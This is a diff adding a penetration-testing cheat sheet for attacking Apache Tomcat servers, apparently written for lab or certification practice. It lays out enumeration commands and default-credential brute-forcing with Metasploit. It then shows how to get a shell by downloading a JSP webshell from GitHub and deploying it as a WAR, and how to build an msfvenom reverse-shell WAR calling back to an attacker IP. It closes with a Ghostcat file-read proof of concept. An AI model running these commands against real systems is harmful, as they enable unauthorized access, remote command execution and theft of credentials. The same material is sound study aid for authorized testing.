@@ -1,0 +1,91 @@
+🔎 Tomcat Discovery & Enumeration - Got This, Do That
+✅ Got This:
+Nmap shows port 8080 or 8180 open
+or
+You see Tomcat keywords in EyeWitness / source / HTTP headers
+
+📍 Do That:
+Check version directly:
+
+bash
+Copy
+Edit
+curl -s http://<target>:8080/ | grep -i tomcat
+curl -s http://<target>:8080/docs/
+curl -s http://<target>:8080/invalid
+Check for /manager and /host-manager:
+
+bash
+Copy
+Edit
+gobuster dir -u http://<target>:8080 -w /usr/share/wordlists/dirb/common.txt
+👤 Tomcat Login Enum
+✅ Got This:
+/manager/html is accessible (even if 401 Unauthorized)
+
+📍 Do That:
+Try default creds manually or via:
+
+bash
+Copy
+Edit
+msf6 > use auxiliary/scanner/http/tomcat_mgr_login
+USERPASS_FILE: /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_userpass.txt
+
+Or, use your custom Python brute script. Proxy through Burp if needed to watch traffic.
+
+💥 Got Auth? Attack Flow
+✅ Got This:
+Valid creds to /manager/html
+
+📍 Do That:
+Manual WAR deploy
+
+Get JSP shell:
+
+bash
+Copy
+Edit
+wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp
+zip -r backup.war cmd.jsp
+Upload WAR via Manager GUI
+Browse: /backup/cmd.jsp?cmd=id
+
+OR use Metasploit:
+
+bash
+Copy
+Edit
+msf6 > use exploit/multi/http/tomcat_mgr_upload
+OR create a custom msfvenom WAR reverse shell:
+
+bash
+Copy
+Edit
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 -f war > revshell.war
+🪓 Ghostcat (CVE-2020-1938)
+✅ Got This:
+Nmap shows port 8009 open
+Apache JServ Protocol (ajp13)
+
+📍 Do That:
+Use Ghostcat LFI PoC:
+
+bash
+Copy
+Edit
+python2.7 tomcat-ajp.lfi.py <target> -p 8009 -f WEB-INF/web.xml
+Can’t hit /etc/passwd, only files inside webapps
+
+Goal: extract sensitive info (like creds or class names) from web.xml, context.xml, etc.
+
+🧠 Mindset Recap:
+Tomcat ≠ public blog, it’s often dev/internal = bigger fish
+
+Don’t waste time on fancy recon if creds are weak
+
+WAR deployment = instant shell if creds valid
+
+Always clean up your shells: undeploy and report
+
+ 
